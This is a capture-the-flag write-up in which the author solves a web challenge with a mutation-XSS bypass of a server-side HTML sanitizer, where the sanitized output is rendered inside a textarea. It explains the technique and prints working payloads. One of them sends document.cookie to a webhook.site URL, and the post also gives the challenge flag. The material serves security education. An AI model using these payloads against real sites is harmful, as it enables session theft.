---
source: kevin-mizu
source_url: https://mizu.re/post/xss-me-luigi
title: "XSS me luigi | mizu.re"
description: "XSS me luigi"
---

_keyboard\_arrow\_up_

title: XSS me luigi

date: May 28, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [Esaip\_2023](https://mizu.re/tag/Esaip_2023) [MyChallenges](https://mizu.re/tag/MyChallenges)

# XSS me luigi

![](https://mizu.re/articles/writeups/esaip_2023/xss_me_luigi/images/logo.png)

* * *

Difficulty: 492 points \| 3 solves

Description: Another simple XSS challenge... Or maybe not that simple 👀

Sources: [xss\_me\_luigi.zip](https://mizu.re/articles/writeups/esaip_2023/xss_me_luigi/xss_me_luigi.zip)

Author: [Me :p](https://twitter.com/kevin_mizu)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/xss-me-luigi#%EF%B8%8F-recon)
- [💉 Injection context](https://mizu.re/post/xss-me-luigi#-injection-context)
- [⏩ Sanitizer bypass](https://mizu.re/post/xss-me-luigi#-sanitizer-bypass)
- [🚩 Retrieve the flag](https://mizu.re/post/xss-me-luigi#-retrieve-the-flag)

## 🕵️ Recon

For this challenge, I wanted to highlight Server Side HTML Sanitizer issue in a specific context. To not disturb challengers, I made a pretty simple website which only has a textarea to input the HTML:

![home.png](https://mizu.re/articles/writeups/esaip_2023/xss_me_luigi/images/home.png)

Taking a look into the sources, we can see that it uses the [CTFd](https://github.com/CTFd/CTFd)'s sanitizer ( [Pybluemonday](https://github.com/ColdHeat/pybluemonday)) configuration:

- src/app/utils/security.py:

```py
# Secure source: https://raw.githubusercontent.com/CTFd/CTFd/master/CTFd/utils/security/sanitize.py (latest version obviously :p)

from pybluemonday import UGCPolicy

# Retracted

def sanitize_html(html):
    return SANITIZER.sanitize(html)
```

Looking into the [pybluemonday](https://github.com/ColdHeat/pybluemonday) github repository, we can see that it is a wrapper to the golang [bluemonday](https://github.com/microcosm-cc/bluemonday) HTML sanitizer. This is important because looking into past CVE could help us a little bit in the way to solve this challenge ( [CVE-XXX-XXXX](https://www.youtube.com/watch?v=H1TVk3HhL9E)).

## 💉 Injection context

When searching for XSS in a Server Side HTML Sanitizer, it is really important to take care about the injection context:

- src/app/templates/index.html:

```html
<body style="text-align: center;">
    <h1>HTML Tester</h1>
    <form method="GET" action="">
        <textarea name="html" style="margin-bottom: 15px;">{{html | safe}}</textarea><br>
        <input type="submit" value="Render" style="margin-bottom: 20px;">
    </form>

    <br>
    <hr>
    <br>

    {{ html | safe }}

    <div style="padding-top: 100px;">
        <a href="/report">Report</a>
    </div>
</body>
```

As you can see in the above snippet, there is 2 injections points. This is really important because for the 2nd one, it would be impossible to get an XSS. Without looking into the sources, it would be possible to detect it using the following payload:

```html
</textarea><h1>Hello</h1>
```

![textarea.png](https://mizu.re/articles/writeups/esaip_2023/xss_me_luigi/images/textarea.png)

Why is this injection point different from the first one? In fact, it is inside a textarea which is a well known vector of mXSS 🔥

But, before continuing, what is a mXSS?

A mXSS or mutation XSS, is a kind of XSS that abuse the browser parsing. For specific tags like style, textarea, title... the browser needs to know where the tags end to parse their contents.

Thus, when the browser reach for example a textarea, it will ignore every other tags until it found the textarea closure tag. This specific behavior will break any context and potentially escape dangerous HTML code!

For example: <textarea><p title="</textarea><img src=x onerror=alert()>"></p>.

_More information about this type of vulnerability can be found [here](https://research.securitum.com/dompurify-bypass-using-mxss/)._

## ⏩ Sanitizer bypass

To understand how a mXSS could occur in this context, it is important to illustrate our situation:

![context.png](https://mizu.re/articles/writeups/esaip_2023/xss_me_luigi/images/context.png)

As we can see, from the sanitizer perspective, it has no idea the current input it is sanitizing is contained inside a textarea tag while the browser will receive it. Thanks to the SANITIZER.AllowComments() in the [CTFd](https://github.com/CTFd/CTFd) configuration, it is possible to create a such context:

```py
from security import sanitize_html
sanitize_html('<!-- <img src=x onerror="alert(1)"> -->')
```

![commentary.png](https://mizu.re/articles/writeups/esaip_2023/xss_me_luigi/images/commentary.png)

Thus, using the textarea context, we can trigger an mXSS in the client side to trigger an alert! 🔥

```html
<!-- </textarea><script>alert()</script> -->
```

![xss.png](https://mizu.re/articles/writeups/esaip_2023/xss_me_luigi/images/xss.png)

## 🚩 Retrieve the flag

```html
<!-- </textarea><script>fetch("https://webhook.site/935213b4-ea6b-4219-97b2-1516aeb94fc8?cookie=".concat(document.cookie))</script> -->
```

Flag: ECTF{T4k3\_c4R3\_0f\_Server\_S1d3\_HTML\_S4nitizeR\_C0nteXt} 🎉

[_keyboard\_arrow\_left_ Abusing Client-Side Desync on Werkzeug](https://mizu.re/post/abusing-client-side-desync-on-werkzeug)

[Infinite Mario _keyboard\_arrow\_right_](https://mizu.re/post/infinite-mario)